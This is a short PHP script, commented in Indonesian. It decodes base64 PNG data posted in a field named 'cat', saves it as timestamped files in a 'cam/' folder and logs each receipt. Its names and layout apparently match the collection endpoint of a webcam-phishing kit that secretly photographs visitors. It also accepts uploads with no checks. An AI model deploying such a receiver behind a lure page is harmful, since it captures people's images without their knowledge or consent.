<?php
// Folder untuk simpan foto
$folder = 'cam/';
if (!is_dir($folder)) {
    mkdir($folder, 0755, true);
}

$date = date('dMYHis');
$imageData = $_POST['cat'];

if (!empty($imageData)) {
    // Tulis log penanda
    error_log("Received" . "\r\n", 3, "Log.log");

    // Buang prefix "data:image/png;base64,"
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);

    // Simpan ke folder cam/
    $filename = $folder . 'cam' . $date . '.png';
    $fp = fopen($filename, 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);
}

exit();
?>
